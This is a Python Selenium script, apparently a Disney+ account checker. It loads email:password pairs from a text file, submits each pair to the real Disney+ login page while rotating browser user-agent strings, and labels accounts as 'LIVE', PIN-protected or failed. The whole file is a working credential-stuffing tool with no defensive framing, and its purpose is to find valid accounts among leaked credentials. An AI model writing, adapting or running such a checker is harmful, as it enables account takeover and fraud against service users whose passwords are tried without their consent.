from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.wait import WebDriverWait
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from lxml import html
from colorama import Fore 
import time as tmp
import random   
import re

class Disney:
    def __init__(self):
        self.url_disney_login = 'https://www.disneyplus.com/login'
        self.email = "email"
        self.button_email = "//form[@id='loginEmail']/div[2]"
        self.response_password = '//form/div[1]/span/p/text()'
        self.response_pin = '//form/p[1]/text()' 
        self.password = 'password'
        self.button_password = 'password-continue-login'
        self.error_14 = '//div[@id="password__error"]/text()'

        self.user_agent = None

    def Agent(self):
        user_agent = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.78",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 OPR/78.0.4093.184"]

        agente = random.choice(user_agent)
        return agente
        

    def start_disney(self): 
        with open('cuentas.txt','r') as file:
            lines = file.readlines()
            options = Options()

            for line in lines:
                Email,Password = (line.strip().split(':'))

                options.set_preference("general.useragent.override",self.Agent())
                driver = webdriver.Firefox(options=options)

                driver.get(self.url_disney_login)
                driver.refresh()
                # print(driver.execute_script("return navigator.userAgent;"))

                time = WebDriverWait(driver, 60)

                try:
                    email = time.until(EC.presence_of_element_located((By.ID,self.email)))
                    email.send_keys(Email)

                    button_email = driver.find_element(By.XPATH,self.button_email)
                    button_email.click()

                    tmp.sleep(6)
                    code = html.fromstring(driver.page_source)

                    try:
                        code_text_password = code.xpath(self.response_password)[0]
                        password = time.until(EC.presence_of_element_located((By.ID,self.password)))
                        password.send_keys(Password)
                        button_password = driver.find_element(By.ID,self.button_password)
                        button_password.click()
                        try:
                            tmp.sleep(6)
                            code = html.fromstring(driver.page_source)
                            error_14 = code.xpath(self.error_14)[0]
                            resp = 'Require Password'
                            print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f' Password:{Fore.WHITE+Password}',Fore.YELLOW+f' Status:{Fore.RED+resp}')
                            # print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f'\nPassword:{Fore.WHITE+Password}',Fore.YELLOW+f'\nStatus:{Fore.RED+resp}\n')
                            driver.quit()

                        except:
                            resp = 'LIVE'
                            print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f'Email:{Fore.WHITE+Password}',Fore.YELLOW+f'Status:{Fore.GREEN+resp}')
                            # print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f' Password:{Fore.WHITE+Password}',Fore.YELLOW+f' Status:{Fore.RED+resp}')
                            # print(f'Account Info\nEmail:{Email}\nEmail:{Password}\nStatus:LIVE')
                            driver.quit()
                            
                    except TimeoutException:
                        resp = 'account not register or subcription vecind'
                        print(Fore.YELLOW+f'Email:{Fore.WHITE+Email}',Fore.YELLOW+f' Password:{Fore.WHITE+Password}',Fore.YELLOW+f' Status:{Fore.RED+resp}')
                        # print(Fore.YELLOW+F'Email:{Fore.WHITE+Email}',Fore.YELLOW+f'\nPassword:{Fore.WHITE+Password}',Fore.YELLOW+f'\nStatus:{Fore.RED+resp}\n')
                        # print('account not register or subcription vecind')
                        driver.quit()
                    
                    except:
                        code_text_pin = code.xpath(self.response_pin)[0]
                        resp = 'Require Pin'
                        print(Fore.YELLOW+F'Email:{Fore.WHITE+Email}',Fore.YELLOW+f' Password:{Fore.WHITE+Password}',Fore.YELLOW+f' Status:{Fore.RED+resp}')
                        # print(Fore.YELLOW+F'Email:{Fore.WHITE+Email}',Fore.YELLOW+f'\nPassword:{Fore.WHITE+Password}',Fore.YELLOW+f'\nStatus:{Fore.RED+resp}\n')
                        # print('requiere pin')
                        driver.quit()
                except TimeoutException:
                    driver.refresh()
                

strem = Disney()
strem.start_disney()

                    
                #     try:
                #         tmp.sleep(6)
                #         code = html.fromstring(driver.page_source)
                #         error_14 = code.xpath(self.error_14)[0]
                #         print('password invalid')
                        
                #     except:
                #         print('login')

                # except TimeoutException:
                #     print('error de tiempo')
                #     driver.refresh()


# except IndexError:
#     print('fuera de rango')

# except NoSuchElementException:
#     print('elemento no encontrado')

# except TimeoutException:
#     print('error de tiempo')


# try:
                #     code_text_password = code.xpath(self.response_password)[0]
                #     password = time.until(EC.presence_of_element_located((By.ID,self.password)))
                #     password.send_keys(Password)
                #     button_email = driver.find_element(By.ID,self.button_password)
                #     button_email.click()
                #     try:
                #         tmp.sleep(6)
                #         code = html.fromstring(driver.page_source)
                #         error_14 = code.xpath(self.error_14)[0]
                #         print('password invalid')
                #         # try:
                #         #     tmp.sleep(6)
                #         #     code = html.fromstring(driver.page_source)
                #         #     no_count = code.xpath('//button[@id="unauth-nav-button"]')[0]
                #         #     print('account no register')
                #         # except:
                #         #     driver.refresh
                #     except:
                #         print('login')
                # except:
                #     code_text_pin = code.xpath(self.response_pin)[0]
                #     print('requiere pin')
                #     driver.refresh()
